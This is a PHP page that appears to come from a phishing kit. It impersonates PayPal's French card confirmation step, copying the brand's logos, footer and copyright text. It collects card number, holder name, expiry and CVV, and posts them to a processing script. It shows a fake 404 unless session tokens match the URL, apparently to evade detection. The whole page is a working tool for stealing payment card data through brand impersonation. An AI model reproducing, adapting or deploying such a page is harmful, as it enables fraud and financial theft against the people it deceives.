<?php

session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{


  if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotocard']))
  {


?>
<link nonce="" href="../css/head.css" rel="stylesheet">

<head>
  <meta charset="UTF-8">

<link rel="stylesheet" href="card/style.css">

</head>

<html lang="fr_FR" dir="ltr"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>PayPal - Processus de confirmation</title><script nonce="" type="text/javascript">window.webpackPublicPath = '';</script>
<link nonce="" href="../css/head.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300&family=Ubuntu:wght@300&display=swap');
    .notifications{outline:0;margin-bottom:10px;font-size:13px}.notifications.animatable{display:none}.notifications .notification{margin:0;padding:15px 15px 15px 44px;-webkit-border-radius:5px;-moz-border-radius:5px;-khtml-border-radius:5px;border-radius:5px;border-width:1px;border-style:solid;text-align:left;font-size:1em;background:url(https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png) no-repeat;background-size:20px}.notifications .notification.notification-default{background-color:#f7f9fa;background-position:12px -788px;background-position:left 12px top -788px;border-color:#afabae}.lower-than-ie9 .notifications .notification.notification-default{background-position:1% 81.5%}.notifications .notification.notification-critical{background-color:#fff7f7;background-position:12px -387px;background-position:left 12px top -387px;border-color:#c72e2e}.lower-than-ie9 .notifications .notification.notification-critical{background-position:1% 41%}.notifications .notification.notification-help{background-color:#f7fdff;background-position:12px -588px;background-position:left 12px top -588px;border-color:#009cde}.lower-than-ie9 .notifications .notification.notification-help{background-position:1% 61%}.notifications .notification.notification-success{background-color:#f7fff7;background-position:12px 12px;background-position:left 12px top 12px;border-color:#1b9e1b}.lower-than-ie9 .notifications .notification.notification-success{background-position:1% 0}.notifications .notification.notification-warning{background-color:#fffcf7;background-position:12px -188px;background-position:left 12px top -188px;border-color:#f8981f}.lower-than-ie9 .notifications .notification.notification-warning{background-position:1% 20.5%}.deniedCaution{margin-bottom:25px;width:112px;height:100px}.denied{text-align:center}.verification,.unavailable{text-align:left}.verification .headerText{font-size:30px}.verification .verification-message{margin:0 0 24px;text-align:center}.verification .pin{margin:0 0 12px;text-align:center;font-size:36px;color:#2c2e2f}.mobileNotification{padding:36px 0 24px}.mobileScreen{width:121px;margin:auto}
</style>
<style>
a.button:hover, a.button:link:hover, a.button:visited:hover, .button:hover {
    background-color: #005ea6;
    outline: 0;
}
a.button, a.button:link, a.button:visited, .button {
    width: 100%;
    height: 44px;
    padding: 0;
    border: 0;
    display: block;
    background-color: #0070ba;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    -khtml-border-radius: 4px;
    border-radius: 4px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    cursor: pointer;
    -webkit-appearance: none;
    -moz-appearance: none;
    -ms-appearance: none;
    -o-appearance: none;
    appearance: none;
    -webkit-tap-highlight-color: transparent;
    color: #fff;
    font-size: 1em;
    text-align: center;
    font-weight: 700;
    font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
    text-shadow: none;
    text-decoration: none;
    -webkit-transition: background-color .4s ease-out;
    -moz-transition: background-color .4s ease-out;
    -o-transition: background-color .4s ease-out;
    transition: background-color .4s ease-out;
    -webkit-font-smoothing: antialiased;
}
</style>
<link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="../img/favicon.ico">

<link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp57.png"><link rel="apple-touch-icon" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png"><link rel="apple-touch-icon" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png"><link rel="apple-touch-icon" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png">

</head>


<body>
  <header style="background-color: transparent"><div class="header-content"><a href="//www.paypal.com/"><img style="position: relative;
top: 1px;width: 120px;" src="../img/54qsrg.png"></a><div class="links"><a href="/paypalme/" class="link-list-item"></a></div><div style="display:inline-block;float:right"><a class="my-paypal-me" href="#">Deconnexion</a></div></div></header>
<!-- partial:index.partial.html -->

<form action="process004.php?<?php echo $_SESSION['userid'];?>" method="post">

<div class="wrapper" id="app" style="padding-bottom: 200px;">
    <div class="card-form">
      <div class="card-list">
        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
          <div class="card-item__side -front">
            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
            <div class="card-item__cover">
              <img
              v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg" >
            </div>
            
            <div class="card-item__wrapper">
              <div class="card-item__top">
                <img src="../img/3ds.png" class="card-item__chip" style="width: 70px;">
                <div class="card-item__type">
                  <transition name="slide-fade-up">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                  </transition>
                </div>
              </div>
              <label for="cardNumber" class="card-item__number" ref="cardNumber">
                <template v-if="getCardType === 'amex'">
                 <span v-for="(n, $index) in amexCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div
                      class="card-item__numberItem"
                      v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''"
                    >*</div>
                    <div class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div
                      class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      v-else
                      :key="$index + 1"
                    >{{n}}</div>
                  </transition>
                </span>
                </template>

                <template v-else>
                  <span v-for="(n, $index) in otherCardMask" :key="$index">
                    <transition name="slide-fade-up">
                      <div
                        class="card-item__numberItem"
                        v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''"
                      >*</div>
                      <div class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        :key="$index" v-else-if="cardNumber.length > $index">
                        {{cardNumber[$index]}}
                      </div>
                      <div
                        class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        v-else
                        :key="$index + 1"
                      >{{n}}</div>
                    </transition>
                  </span>
                </template>
              </label>
              <div class="card-item__content">
                <label for="cardName" class="card-item__info" ref="cardName">
                  <div class="card-item__holder">Propriétaire de la carte</div>
                  <transition name="slide-fade-up">
                    <div class="card-item__name" v-if="cardName.length" key="1">
                      <transition-group name="slide-fade-right">
                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
                      </transition-group>
                    </div>
                    <div class="card-item__name" v-else key="2">Nom</div>
                  </transition>
                </label>
                <div class="card-item__date" ref="cardDate">
                  <label for="cardMonth" class="card-item__dateTitle">Date</label>
                  <label for="cardMonth" class="card-item__dateItem">
                    <transition name="slide-fade-up">
                      <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
                      <span v-else key="2">MM</span>
                    </transition>
                  </label>
                  /
                  <label for="cardYear" class="card-item__dateItem">
                    <transition name="slide-fade-up">
                      <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
                      <span v-else key="2">YY</span>
                    </transition>
                  </label>
                </div>
              </div>
            </div>
          </div>
          <div class="card-item__side -back">
            <div class="card-item__cover">
              <img
              v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
            </div>
            <div class="card-item__band"></div>
            <div class="card-item__cvv">
                <div class="card-item__cvvTitle">CVV</div>
                <div class="card-item__cvvBand">
                  <span v-for="(n, $index) in cardCvv" :key="$index">
                    *
                  </span>

              </div>
                <div class="card-item__type">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
                </div>
            </div>
          </div>
        </div>
      </div>
    
      <div class="card-form__inner">
          <?php
if(strpos($_SERVER['REQUEST_URI'], $_SESSION['errorcard']))
{

?>
<div class="notifications"><br><br><p style="font-size:13px;font-family: 'Roboto', sans-serif;" class="notification notification-critical" role="alert"><strong>Veuillez vérifier vos informations de carte</strong></p>
<br>
<br>
</div>
<?php
}
?>
        <div class="card-input">
          <label style="font-family: 'Hind Madurai', sans-serif; " for="cardNumber" class="card-input__label">Numéro de carte</label>
          <input type="text" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" name="ccnum" data-ref="cardNumber" autocomplete="off">
        </div>
        <div class="card-input">
         <label style="font-family: 'Hind Madurai', sans-serif; " for="cardName" class="card-input__label">Nom sur la carte</label>
          <input  type="text" id="cardName" value="<?php echo $_SESSION['nom'].' '.$_SESSION['prenom']; ?><" class="card-input__input" v-model="cardName" v-on:focus="focusInput" name="ccname" v-on:blur="blurInput" data-ref="cardName" autocomplete="off">
        </div>
        <div class="card-form__row">
          <div class="card-form__col">
            <div class="card-form__group">
              <label style="font-family: 'Hind Madurai', sans-serif; " for="cardMonth" class="card-input__label">Date d'expiration</label>
              <select name="ccm" class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
                <option value="" disabled selected>Mois</option>
                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
                    {{n < 10 ? '0' + n : n}}
                </option>
              </select>
              <select name="ccy" class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
                <option value="" disabled selected>Année</option>
                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
                    {{$index + minCardYear}}
                </option>
              </select>
            </div>
          </div>
          <div class="card-form__col -cvv">
            <div class="card-input">
              <label style="font-family: 'Hind Madurai', sans-serif; " for="cardCvv" class="card-input__label">CVV</label>
              <input name="ccv" type="text" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off">
            </div>
          </div>
        </div>

        <button style="width: 100%" type="submit" style="width:300px;margin:0 auto;" class="button actionContinue" id="btnLogin" name="btnNext" value="Login">Continuer</button>
      </div>
    </div>
    
    
  </div>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="card/script.js"></script>
</form>
</body>

<footer id="footer" style="height: 40px;"><div class="footers-container"><div class="ppme-footer"><div class="links"><a href="/paypalme/" class="link-list-item"><span class="align-with-button">À propos de PayPal</span></a><a href="/paypalme/pages/terms" class="link-list-item"><span class="align-with-button">Conditions</span></a></div></div><div class="paypal-footer" role="contentinfo"><div class="navbar-inner"><div class="navbar-content"><ul class="inline footerList-links footerList-links_primary"><li class="country-list-item"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></li><li> <a href="#">À propos de PayPal</a> </li> <li> <a href="#">Contact</a> </li> <li> <a href="#">Tarifs</a> </li> <li> <a href="#">Respect de la vie privée</a> </li> </ul><div class="country-selector-container"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></div><p class="footerCopyright nemo_copyrightText hide-on-mobile">©1999-2021 PayPal, Inc. Tous droits réservés.</p><ul class="inline footerList-links footerList-links_secondary"><li> <a href="#">Développeurs PayPal</a> </li> <li> <a href="#">Blog PayPal</a> </li> <li> <a href="#">Solutions e-commerce</a> </li> <li> <a href="#">Plan du site</a> </li> </ul><p class="footerCopyright nemo_copyrightText hide-on-desktop">©1999-2021 PayPal, Inc. Tous droits réservés.</p></div></div></div></div></footer>



</html>
<?php

}
else{
die('HTTP/1.0 404 Not Found');
}

}else{
  die('HTTP/1.0 404 Not Found');
}

?>